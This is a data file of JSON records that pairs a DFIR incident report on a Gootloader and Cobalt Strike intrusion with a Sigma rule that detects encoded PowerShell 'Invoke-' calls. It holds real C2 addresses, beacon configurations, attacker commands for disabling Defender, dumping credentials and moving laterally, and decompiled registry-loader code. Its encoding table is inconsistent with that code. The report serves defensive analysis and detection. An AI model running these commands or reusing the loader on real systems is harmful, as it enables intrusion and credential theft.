Admin Mode:    Yes\n      Virtual Account:    No\n      Elevated Token:     Yes\n  \n  Impersonation Level:    Impersonation\n  \n  New Logon:\n      Security ID:        ████████\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3798A24\n      Linked Logon ID:    0x0\n      Network Account Name:    -\n      Network Account Domain:  -\n      Logon GUID:         {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n      Process ID:         0x3fc\n      Process Name:       C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n      Workstation Name:   -\n      Source Network Address:  ████████\n      Source Port:        0\n  \n  Detailed Authentication Information:\n      Logon Process:      User32\n      Authentication Package:   Negotiate\n      Transited Services:   -\n      Package Name (NTLM only): -\n      Key Length:         0\n```\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n\n```image\nAlt: Document Access\nDescription: The image is a table displaying details of processes created during a cyber incident. It contains three columns: 'Action Type,' 'Initiating Process Command Line,' and 'Process Command Line.' The 'Action Type' indicates that 'ProcessCreated' occurred twice, both initiated by 'Explorer.EXE.' The 'Process Command Line' details that 'WORDPAD.EXE' was used to open two document files located in a specified directory, with the file paths partially redacted.\nTranscription: |\n  Action Type       Initiating Process Command Line   Process Command Line\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n```\n\nShellbags revealed attempts to enumerate multiple file shares containing information of interest to the threat actor.\n\n```image\nAlt: File Shares\nDescription: The image depicts a screenshot of a file directory structure, showing folders labeled 'IT,' 'Passwords,' and 'Contracts' under the 'Computers and Devices' section on a desktop interface. The screenshot includes icons representing directories and appears to display information related to file enumeration, which is relevant to the context of the threat actor's activities in accessing files during RDP sessions.\nTranscription: |\n  Value\n  Desktop\n    Computers and Devices\n      [Redacted]\n        IT\n          Passwords\n        Contracts\n        [Redacted]\n  \n  Drag a column header here to group by that column\n  \n  Value      Icon        Shell Type\n  [Redacted] No image    [Redacted]\n  Contracts  Directory   Directory\n  IT         Directory   Directory\n```\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n```\n\nDuring the intrusion, the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC\nNot After: 2022/04/05 09:25:32 UTC\nIssuer Org: Let's Encrypt\nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n```\n\n### Cobalt Strike\n\n**146.70.78.43**\n\nCobalt Strike server TLS configuration:\n\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer:  C=, ST=, L=, O=, OU=, CN=\nSubject:  C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/visit.js\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/fwlink\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\n**37.120.198.225**\n\nCobalt Strike server TLS configuration:\n\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/cm\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/ptj\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\nReal Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.\n\n```image\nAlt: RITA\nDescription: The image displays a data table generated by RITA (Real Intelligence Threat Analytics) showing network traffic statistics related to Cobalt Strike beacons. It includes columns for score, source IP, destination IP, number of connections, average bytes transferred, interval ranges, size ranges, and their respective modes and counts. The data provides insights into communication patterns with a specific Cobalt Strike server (146.70.78.43), indicating a total of 20,902 connections and an average of 3,883 bytes per connection. This information is critical for analyzing potential command and control activity.\nTranscription: |\n  plaintext\n  Time Generated: Sat, 02 Apr 2022 19:51:10 EDT\n  \n  Score   Source        Destination   Connections   Avg. Bytes   Intvl. Range   Size Range   Intvl. Mode   Size Mode   Intvl. Mode Count   Size Mode Count   Intvl. Skew   Size Skew   Intvl. Dispersion   Size Dispersion   Total Bytes\n  0.995   10.43.61.202  146.70.78.43  20902         3883.000     13780          2567         1             2181        14945               14285             0.000         0.000      0                   0                81180557\n```\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\n\n```\nVolatility 3 Framework 2.0.0\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n...\n0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe   \n0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe    \n0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    \n0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe \n...\n```\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n\n## Indicators\n\n### Network\n\n**Gootloader** \nhttps://kakiosk.adsparkdev[.]com \nhttps://jp.imonitorsoft[.]com \nhttps://junk-bros[.]com \n35.206.117.64:443\n\n**Cobalt Strike** \n146.70.78.43:443 \n37.120.198.225:443\n\n### File\n\n```\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\n\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\n\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\n\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\n\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n```\n\n## Detections\n\n### Network\n\n```\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n```\n\n### Sigma\n\nCustom Sigma rules:\n\n- Deleting Windows Defender scheduled tasks\n- Enabling restricted admin mode\n\nSigma repo rules:\n\n- Bloodhound Detection\n- Powershell download\n- Defender Disable via Powershell\n- Creation of Scheduled Task via Powershell\n- LaZagne LSASS Access\n- Systeminfo Discovery\n- CobaltStrike Named Pipe\n- Malicious PowerShell Commandlets\n- Suspicious Service Installation\n- Suspicious XOR Encoded PowerShell Command Line\n- Too Long PowerShell Commandlines\n- PowerShell Network Connections\n- Rundll32 Internet Connection\n- Mimikatz Use\n\n### Yara\n\nCustom Yara rule\n\n## MITRE\n\n- **T1189** Drive-by Compromise\n- **T1204.001** – User Execution: Malicious Link\n- **T1204.002** – User Execution: Malicious File\n- **T1059.001** – Command and Scripting Interpreter: PowerShell\n- **T1053** – Scheduled Task/Job\n- **T1218.011** – System Binary Proxy Execution: Rundll32\n- **T1555** – Credentials from Password Stores\n- **T1003.001** – OS Credential Dumping: LSASS Memory\n- **T1087** – Account Discovery\n- **T1560** – Archive Collected Data\n- **T1482** – Domain Trust Discovery\n- **T1615** – Group Policy Discovery\n- **T1069** – Permission Groups Discovery\n- **T1018** – Remote System Discovery\n- **T1033** – System Owner/User Discovery\n- **T1021.001** – Remote Services: Remote Desktop Protocol\n- **T1021.006** – Remote Services: Windows Remote Management\n- **T1005** – Data from Local System\n- **T1039** – Data from Network Shared Drive\n- **T1046** – Network Service Scanning\n- **T1562.001** – Impair Defenses: Disable or Modify Tools\n- **T1518.001** – Security Software Discovery\n- **T1071.001** Web Protocols\n- **T1027** – Obfuscated Files or Information",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Invoke Keyword",
      "id": "6385697e-9f1b-40bd-8817-f4a91f40508e",
      "related": [
        {
          "id": "fd6e2919-3936-40c9-99db-0aa922c356f7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "pH-T (Nextron Systems), Harjot Singh, @cyb3rjy0t",
      "date": "2022-05-20",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli_enc": {
          "CommandLine|contains": " -e"
        },
        "selection_cli_invoke": {
          "CommandLine|contains": [
            "SQBuAHYAbwBrAGUALQ",
            "kAbgB2AG8AawBlAC0A",
            "JAG4AdgBvAGsAZQAtA",
            "SW52b2tlL",
            "ludm9rZS",
            "JbnZva2Ut"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_invoke.yml",
    "id": "325"
  },
  {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story\n\n**Categories:** \ncobaltstrike \ngootloader \nlazagne \npsexec\n\n**Published on:** \nMay 9, 2022\n\n---\n\nIn early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector.\n\nThe intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents.\n\n## Background\n\nGootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The threat actors utilize SEO (search engine optimization) poisoning tactics to move compromised websites hosting malware to the top of certain search requests such as “what is the difference between a grand agreement and a contract?” or “freddie mac shared driveway agreement?”\n\nWhen the user searches for these phrases and clicks on one of the top results, they are left with a forum-looking web page where the user is instructed to download a file, which they accidentally execute (double click to open). You can learn more about Gootloader by reading these references: \n1. [“Gootloader” expands its payload delivery options](https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/)\n2. [Gootloader: ‘Initial Access as a Service’ Platform Expands Its Search for High Value Targets](https://www.sentinelone.com/labs/gootloader-initial-access-as-a-service-platform-expands-its-search-for-high-value-targets/)\n3. [Gootloader](https://redcanary.com/threat-detection-report/threats/gootloader/)\n4. [Gootloader’s “mothership” controls malicious content](https://news.sophos.com/en-us/2021/08/12/gootloaders-mothership-controls-malicious-content/)\n\nThe researcher behind the @GootLoaderSites account is doing a great job of providing operational intelligence about the most recent malicious infrastructure. They also contact impacted businesses, monitor for newly created C2 addresses, and make the information public to the community. Thank you!\n\n```image\nAlt: Gootloader Infrastructure\nDescription: The image consists of a series of tweets from the account @GootLoaderSites, detailing current sites associated with the Gootloader malware. Each tweet mentions specific URLs that are serving malicious content, indicating the presence of malware on those sites. The tweets also express a willingness to assist affected parties in cleaning up their sites, highlighting ongoing monitoring and reporting efforts related to Gootloader's operations.\nTranscription: |\n  plaintext\n  GootLoader Sites @GootLoaderSites · Apr 16\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.jlfwealth.com/forum.php\n  \n  GootLoader Sites @GootLoaderSites · Apr 17\n  @JLFwealth FYI your site is delivering malware. Please let me know if you need help cleaning it up, DMs are open.\n  \n  GootLoader Sites @GootLoaderSites · Apr 15\n  Current #GootLoader/#Gootkit site, serving up malicious zip/js s\n  hxxps://www.joskel.nl/forum.php\n```\n\n## Case Summary\n\nThe intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.\n\nFifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.\n\nAfter pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile, on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.\n\nWith those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n\nThe threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n\nThe threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.\n\nOn the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n\n## Services\n\nWe offer multiple services, including a Threat Feed service that tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case, such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline outlining the events of a cyber incident involving SEO poisoning and the Gootloader malware. It categorizes events by time and provides specific actions taken during the attack, such as 'Gootloader Execution,' 'Lateral Movement,' 'Mimikatz Execution,' and 'RDP Connections.' Each entry includes timestamps in UTC and descriptions of the executed commands, tools used, and affected systems. This structured format allows for easy tracking of the attack progression over two days.\nTranscription: |\n  plaintext\n  SEO Poisoning - A Gootloader Story\n  \n  Day 1\n  \n  14:43 UTC Gootloader Execution\n  - WScript.exe olympus.plex.agreement 34603.js\n  - kaiokok.adspardev.com 35.200.117.64:443\n  - Cobalt Strike loaded into memory\n  - 146.70.78.43:443\n  \n  15:00 UTC Lateral Movement from Beachhead Host to Workstation #1 and Disabling of Defender\n  - Via PowerShell Remote Service\n  - %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADA...\n  - powershell.exe -nop -w hidden -c Set-MpPreference -DisableRealtimeMonitoring $true\n  - 146.70.78.43:443\n  \n  15:34 UTC Antivirus Check on Beachhead Host\n  - WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n  \n  14:58 UTC Discovery via Bloodhound\n  - Invoke-BloodHound -CollectionMethod All\n  \n  15:30 UTC Second Cobalt Strike Server on Workstation #1\n  - 37.120.198.225:443\n  \n  15:44 UTC Mimikatz Execution on Beachhead Workstation\n  - Invoke-Mimikatz\n  \n  15:48 UTC LaZagne Execution on Workstation #1\n  - ls.exe all -oN --output C:\\Users\n  \n  16:05 UTC RDP into Workstation #1 from Beachhead Host\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\n  - Microsoft Defender Scheduled Tasks Deleted\n  - C:\\Windows\\system32\\schtasks.exe /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\n  \n  16:38 - 17:01 UTC Lateral Movement to Three Additional User Workstations\n  - Remote Service Execution\n  - \\\\WORKSTATION\\ADMIN$\\abb6ca2.exe\n  \n  21:34 UTC RDP into Domain Controller from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Invoke-WMIMExec -Target DomainController -Domain domain.local -Username USER -Hash \"...\" -Command \"powershell.exe reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0\" -verbose\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  - LaZagne dropped and executed: ls.exe all -oN --output C:\\Users\n  \n  21:49 UTC RDP into File Share Server from Beachhead\n  - Restricted Admin Mode enabled via remote WMI prior to RDP connection\n  - Microsoft Defender Scheduled Tasks Deleted\n  - Cobalt Strike Powershell payload executed through Powershell via RDP session\n  \n  21:53 UTC Documents accessed on File Share Server interactively using Wordpad.exe\n  - C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE \"C:\\shares\\STAFFFILE.docx\"\n  \n  Day 2\n  \n  07:36 UTC Advanced IP Scanner used to port scan network from Domain Controller\n  - C:\\Users\\USER\\AppData\\Local\\Temp\\\\\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\n  - Ports: 21,80,135,443,445,3389,8080,56133,58000,58157,58492,58682,60234,60464,64502\n  \n  07:45 UTC File Server SMB Shares accessed from Domain Controller\n  \n  7:54 UTC RDP Connection to Backup Server\n```\n\nAnalysis and reporting completed by @kostastsale, @iiamaleks, @pigerlin.\n\n## Initial Access\n\nThe threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.\n\n[GootLoader Download](https://www.youtube.com/embed/IdR-tlv7w48?feature=oembed)\n\nThe Javascript file is then executed when double-clicked after the zip is opened.\n\n```image\nAlt: Execution\nDescription: The image depicts a screenshot of a software interface displaying a Windows Registry Editor. On the left side, there are various folders under the path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username', which include 'Phone', 'ShellUI', 'Pim', 'Poom', 'Remote Assistance', 'ScreenMagnifier', 'Sensors', and 'SkyDrive'. The right side shows a table with registry entries labeled '(default)' and indexed rows (0 to 7), containing values that appear to be obfuscated strings. This information is relevant to the analysis of the execution of Gootloader malware, suggesting a technical aspect of the malware's operation.\n```\n\n## Execution\n\nGootloader upon execution creates two registry keys:\n\n```\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username\nHKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n```\n\nThe first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named `powershell.dll`.\n\n```image\nAlt: Registry Keys\nDescription: The image displays a screenshot of a Windows Registry Editor, showing the registry path 'HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0'. It contains a list of registry values with associated data types and values. The left pane shows the key hierarchy, specifically the 'Phone' key and its subkeys, while the right pane details the values stored in 'Username0', indicating the presence of encoded data related to the Gootloader malware. This is relevant for understanding the malware's execution and persistence mechanisms.\nTranscription: |\n  Key name\n  HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0\n  \n  Value Name    Value Type    Data\n  (default)     RegSz         \n  0             RegSz         4d5a90000300000004000000ffff0000b8000...\n  1             RegSz         65a6a586d280700002b0d0012037b1b0004a...\n  2             RegSz         00006e282900000a00120209281e00000a7d...\n  3             RegSz         7f01140003004c250000000000086008b011...\n  4             RegSz         64e616d654f7264696e616c730048696e740...\n  5             RegSz         e33320526567697374727920790052656773...\n  6             RegSz         000000000000000000000000000000000000...\n```\n\nFollowing the Registry events, a PowerShell command was launched executing an encoded command.\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a table summarizing key event details related to a cybersecurity incident. It includes columns for 'EventCode', 'TaskCategory', 'ParentCommandLine', and 'CommandLine'. The 'Process Create' event shows the execution of 'C:\\Windows\\System32\\WScript.exe' and a PowerShell command executing a potentially encoded payload from a specified file path.\nTranscription: |\n  plaintext\n  EventCode   TaskCategory       ParentCommandLine                                                                                                          CommandLine\n  1           Process Create     \"C:\\Windows\\System32\\WScript.exe\"                                                                                          \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/e\"\n              (rule:             \"C:\\Users\\[REDACTED]\\AppData\\Local\\Temp\\Temp1_olympus plea agreement(46196).zip\\olympus_plea_agreement 34603.js\"            NgAxA\"DQANgA0ADkA\"MgAxADEA0WB\"zAGwAZQBlAHAAIAAtAHMAIAAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"QA\"LQB5AHQ\"AZQBtAFAA\"cg\"B\"vAHAaZQ\"ByA\"HQAeQ\"Ag\"AC0\"AcABh\"AH\"QAaA\n              ProcessCreate)\n```\n\n```\n\"powershell.exe\" /c C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe \"/\"e\" NgAxA\"DQANgA0ADkA\"MgAxADEAOwB\"zAGwAZQBlAHAAIAAtAHMAIAA4AD\"MA\"OwAkAG8AcABqAD0ARwBlAH\"...\n```\n\nThe PowerShell command will extract the .NET loader from `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0` and execute the code in memory via `Assembly.Load()`.\n\nThis CyberChef recipe can be used to decode the related PS encoded payload.\n\nOnce the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read `HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username` and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.\n\nA simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n\n```\nq->000\nv->0\nw->1\nr->2\nt->3\ny->4\nu->5\ni->6\no->7\np->8\ns->9\nq->A\nh->B\nj->C\nk->D\nl->E\nz->F\n```\n\n```image\nAlt: .NET Loader\nDescription: The image depicts a code snippet written in C#. It outlines a method for reading encoded data from the Windows registry, decoding it, and loading it into memory for execution. The code includes comments and structured sections labeled as '1. Read encoded data from registry,' '2. Decode data,' and '3. Load into memory and run.' The use of specific classes like `RegistryKey` and `Open.DynamicDllLoader` indicates a focus on manipulating system resources, typical in the context of cyber threat intelligence.\nTranscription: |\n  csharp\n  // Token: 0x60000002 RID: 2 RVA: 0x00002104 File Offset: 0x00000304\n  public static string Test()\n  {\n      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Phone\\\\\" +\n          Environment.UserName);\n      if (registryKey != null)\n      {\n          string text = \"\";\n          for (int i = 0; i < 99999; i++)\n          {\n              string text2 = \"\";\n              try\n              {\n                  text2 = registryKey.GetValue(i.ToString()).ToString();\n              }\n              catch\n              {\n              }\n              if (text2.Length == 0)\n              {\n                  break;\n              }\n              text += text2;\n          }\n          registryKey.Close();\n          \n          // 2. Decode data\n          text = text.Replace(\"q\", \"0\").Replace(\"v\", \"0\").Replace(\"w\", \"1\").Replace(\"r\", \"2\").Replace(\"t\", \"3\").Replace(\"y\", \"4\").Replace(\"u\", \"5\").Replace(\"i\", \"6\").Replace(\"o\", \"7\").Replace(\"p\", \"8\").Replace(\"s\", \"9\").Replace(\"g\", \"A\").Replace(\"h\", \"B\").Replace(\"j\", \"C\").Replace(\"k\", \"D\").Replace(\"l\", \"E\").Replace(\"z\", \"F\");\n          byte[] data = Open.STBA(text);\n          Open.DynamicDllLoader dynamicDllLoader = new Open.DynamicDllLoader();\n          bool flag = dynamicDllLoader.LoadLibrary(data);\n          Console.WriteLine(\"Loaded: \" + flag);\n          if (flag)\n          {\n              uint procAddress = dynamicDllLoader.GetProcAddress(\"mono_trace\");\n              Console.WriteLine(\"Handle: \" + procAddress);\n          }\n      }\n      Console.ReadKey();\n      return \"Install\";\n  }\n```\n\nThe below diagram 